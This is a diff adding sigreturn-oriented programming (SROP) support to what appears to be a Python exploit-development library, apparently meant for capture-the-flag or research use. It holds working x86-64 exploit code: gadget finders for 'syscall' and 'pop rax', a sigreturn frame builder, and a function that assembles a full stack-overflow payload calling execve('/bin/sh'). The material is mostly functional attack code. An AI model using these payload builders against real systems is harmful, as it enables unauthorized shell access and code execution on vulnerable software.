@@ -137,3 +137,84 @@ def build_ret2system(offset: int, pop_rdi: int, binsh: int, system: int, length:
 def _cyclic(n):
     from .primitive import cyclic
     return cyclic(n)
+
+
+# --------------------------------------------------------------------------- SROP (x86-64)
+# Sigreturn-oriented programming: a single `syscall` with rax=15 (rt_sigreturn) restores the ENTIRE
+# register set from a frame the attacker placed on the stack. It turns a stack overflow + one
+# syscall gadget into arbitrary register control -- enough to call execve("/bin/sh",0,0) without any
+# pop-gadgets. Used for static/no-PIE targets where a ret2libc/ret2csu chain isn't available.
+
+_SC = b"\x0f\x05"                                   # syscall
+_SC_RET = b"\x0f\x05\xc3"                           # syscall ; ret
+_POP_RAX = b"\x58\xc3"                              # pop rax ; ret
+
+# byte offset (in 8-byte words) of each register inside the amd64 rt_sigframe the kernel reads at
+# rsp when rt_sigreturn runs. Matches the Linux sigcontext layout (== pwntools SigreturnFrame).
+_SIGFRAME_WORDS = {
+    "r8": 5, "r9": 6, "r10": 7, "r11": 8, "r12": 9, "r13": 10, "r14": 11, "r15": 12,
+    "rdi": 13, "rsi": 14, "rbp": 15, "rbx": 16, "rdx": 17, "rax": 18, "rcx": 19,
+    "rsp": 20, "rip": 21,
+}
+_CSGSFS_WORD = 23                                   # cs=0x33 for 64-bit user code
+
+
+def find_syscall(data: bytes):
+    """VA of a `syscall ; ret` gadget (preferred) or a bare `syscall`, or None."""
+    return _find_exec(data, _SC_RET) or _find_exec(data, _SC)
+
+
+def find_pop_rax(data: bytes):
+    """VA of a `pop rax ; ret` gadget, or None (rax must then be set another way)."""
+    return _find_exec(data, _POP_RAX)
+
+
+def find_writable(data: bytes, need: int = 16):
+    """(vaddr, size) of a writable PT_LOAD segment with at least `need` bytes, or None. Where a
+    read() can plant "/bin/sh" at a fixed address on a no-PIE target."""
+    for off, sz, va, flags in _loads(data):
+        # p_flags bit1 = W. Use MEMSZ where available; _loads gives filesz, which for .data is fine
+        # and for .bss undercounts -- but any writable LOAD gives us a usable address.
+        if (flags & 2) and sz >= need:
+            return (va, sz)
+    return None
+
+
+def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx=0,
+                    r8=0, r9=0, r10=0, r11=0, r12=0, r13=0, r14=0, r15=0) -> bytes:
+    """The 248-byte amd64 rt_sigframe restored by rt_sigreturn(rax=15). Set the registers the
+    controlled `syscall` at `rip` will then use (e.g. rax=59, rdi=&"/bin/sh" for execve)."""
+    words = [0] * 31                                # 31 qwords = 0xF8 bytes
+    vals = dict(rip=rip, rsp=rsp, rdi=rdi, rsi=rsi, rdx=rdx, rax=rax, rbp=rbp, rbx=rbx, rcx=rcx,
+                r8=r8, r9=r9, r10=r10, r11=r11, r12=r12, r13=r13, r14=r14, r15=r15)
+    for reg, w in _SIGFRAME_WORDS.items():
+        words[w] = vals[reg]
+    words[_CSGSFS_WORD] = 0x33
+    return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)
+
+
+def srop_feasible(data: bytes):
+    """What an SROP execve chain needs, and which pieces this binary supplies. Returns a dict the
+    exploit stage uses to decide: {syscall, pop_rax, writable, binsh}. `syscall` is required; a
+    writable segment (to plant "/bin/sh") and a way to set rax=15 are the other gatekeepers."""
+    return {
+        "syscall": find_syscall(data),
+        "pop_rax": find_pop_rax(data),
+        "writable": find_writable(data),
+        "binsh": find_string(data, b"/bin/sh"),
+    }
+
+
+def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
+                      pop_rax: int, rsp: int = 0) -> bytes:
+    """One-shot SROP execve("/bin/sh",0,0) for a binary WITH a `pop rax; ret` gadget and "/bin/sh"
+    already at `binsh`: overflow -> pop rax;15 -> syscall(rt_sigreturn) -> frame(execve).
+    The `syscall` gadget doubles as the frame's rip so the restored rax=59 runs execve."""
+    body = bytearray(_cyclic(offset))
+    body += struct.pack("<Q", pop_rax)
+    body += struct.pack("<Q", 15)                   # rt_sigreturn
+    body += struct.pack("<Q", syscall)              # executes rt_sigreturn
+    body += sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0, rsp=rsp or binsh)
+    if len(body) < length:
+        body += b"C" * (length - len(body))
+    return bytes(body)
